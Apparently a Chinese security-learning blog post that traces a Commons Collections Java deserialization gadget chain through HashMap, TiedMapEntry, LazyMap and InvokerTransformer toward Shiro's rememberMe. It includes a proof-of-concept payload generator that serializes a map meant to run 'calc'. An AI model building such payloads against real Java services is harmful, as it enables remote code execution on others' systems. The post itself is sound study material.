+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161442640.webp" alt="image-20240816144234490" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161442640.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161442640.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161442640.webp?size=large 2x" data-title="image-20240816144234490" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里的反序列化入口点用的是HashMap，梦回CC6</p>
+<pre tabindex="0"><code>Map expMap = new HashMap();
+......
+oos.writeObject(expMap);</code></pre><p>我是在lazymap的get方法开始打的断点，从这里看一下前面是怎么调过来的</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161509943.webp" alt="image-20240816150947736" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161509943.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161509943.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161509943.webp?size=large 2x" data-title="image-20240816150947736" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>在HashMap的readObject⽅法中，调⽤到了hash(key)</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161511159.webp" alt="image-20240816151136925" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161511159.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161511159.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161511159.webp?size=large 2x" data-title="image-20240816151136925" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>而hash⽅法中，调⽤到了key.hashCode() ，也就到了tme的hashCode()方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161512887.webp" alt="image-20240816151214750" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161512887.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161512887.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161512887.webp?size=large 2x" data-title="image-20240816151214750" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>hashcode进一步调用进getvalue，到这里和cc6的链子一样的</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">hashCode</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">value</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">getValue</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> (<span style="color:#ff636f">this</span>.<span style="color:#58a1dd">getKey</span>() <span style="color:#ff636f">==</span> <span style="color:#ff636f">null</span> <span style="color:#ff636f">?</span> <span style="color:#58a1dd">0</span> : <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">getKey</span>().<span style="color:#58a1dd">hashCode</span>()) <span style="color:#ff636f">^</span> (<span style="color:#58a1dd">value</span> <span style="color:#ff636f">==</span> <span style="color:#ff636f">null</span> <span style="color:#ff636f">?</span> <span style="color:#58a1dd">0</span> : <span style="color:#58a1dd">value</span>.<span style="color:#58a1dd">hashCode</span>());
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>到这里马上要调用lazymap的get方法了，传入的key是TemplatesImpl对象！！！到这里就和cc6不一样了，感觉这一步也是最精髓的地方，在cc6里，这一步我们是传入ChainedTransformer去调用ChainedTransformer.transform()</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161515385.webp" alt="image-20240816151537218" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161515385.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161515385.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161515385.webp?size=large 2x" data-title="image-20240816151537218" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>而这里是借助InvokerTransformer来手动触发TemplatesImpl的newTransformer，毕竟这个类这里写的跟后门似的，感觉又回到了cc1</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161518658.webp" alt="image-20240816151800464" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161518658.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161518658.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161518658.webp?size=large 2x" data-title="image-20240816151800464" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>那为啥之前要走这么多步呢？我们之前是用ConstantTransformer拿对象，而这里要用的TemplatesImpl可以直接构建进去</p>
+<pre tabindex="0"><code>LazyMap.get()
+	ChainedTransformer.transform()
+		ConstantTransformer.transform()
+			InvokerTransformer.transform()</code></pre><p>这是我调试cc6时候的截图，之前的处理这个key完全没有利用到，只要调用进factory.transform() （transformerChain.transform），就可以拿到事先构造好的对象（用的是ConstantTransformer）</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121411675.webp" alt="image-20240812141117470" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121411675.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121411675.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121411675.webp?size=large 2x" data-title="image-20240812141117470" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>斯。。。我们到这里有两个执行命令的点，一个是TemplatesImpl执行动态字节码，另一个就是反射拿getRuntime对象，我比较好奇这里能不能传入getRuntime对象这么玩呢？</p>
+<p>应该是可以的吧？但是不咋会写链子，一直跑不通，😥</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span> <span style="color:#ff636f">[]</span><span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">test</span>().<span style="color:#58a1dd">getPayload</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">getPayload</span>() <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Class</span> <span style="color:#58a1dd">r</span> <span style="color:#ff636f">=</span>  <span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">class</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Method</span> <span style="color:#58a1dd">m</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">r</span>.<span style="color:#58a1dd">getMethod</span>(<span style="color:#a6be9d">&#34;getRuntime&#34;</span>,<span style="color:#ff636f">null</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Runtime</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">Runtime</span>) <span style="color:#58a1dd">m</span>.<span style="color:#58a1dd">invoke</span>(<span style="color:#ff636f">null</span>,<span style="color:#ff636f">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Transformer</span> <span style="color:#58a1dd">transformer</span>  <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;exec&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span>{<span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">class</span>}, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>{<span style="color:#a6be9d">&#34;calc&#34;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">innerMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">outerMap</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LazyMap</span>.<span style="color:#58a1dd">decorate</span>(<span style="color:#58a1dd">innerMap</span>, <span style="color:#58a1dd">transformer</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">TiedMapEntry</span> <span style="color:#58a1dd">tme</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TiedMapEntry</span>(<span style="color:#58a1dd">outerMap</span>, <span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">expMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">expMap</span>.<span style="color:#58a1dd">put</span>(<span style="color:#58a1dd">tme</span>, <span style="color:#a6be9d">&#34;valuevalue&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">outerMap</span>.<span style="color:#58a1dd">clear</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ByteArrayOutputStream</span> <span style="color:#58a1dd">barr</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ByteArrayOutputStream</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectOutputStream</span> <span style="color:#58a1dd">oos</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectOutputStream</span>(<span style="color:#58a1dd">barr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">writeObject</span>(<span style="color:#58a1dd">expMap</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">barr</span>.<span style="color:#58a1dd">toByteArray</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>先到这里吧，后面还要做一件事，就是进去调试一下看看shiro是怎么对rememberMe进行处理的</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-16 17:20:01">Updated on 2024-08-16&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7/" class="post-nav-item" rel="prev" title="CC3"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CC3</a>
+      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/3/" class="post-nav-item" rel="next" title="开源工具分析-Fscan">开源工具分析-Fscan<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
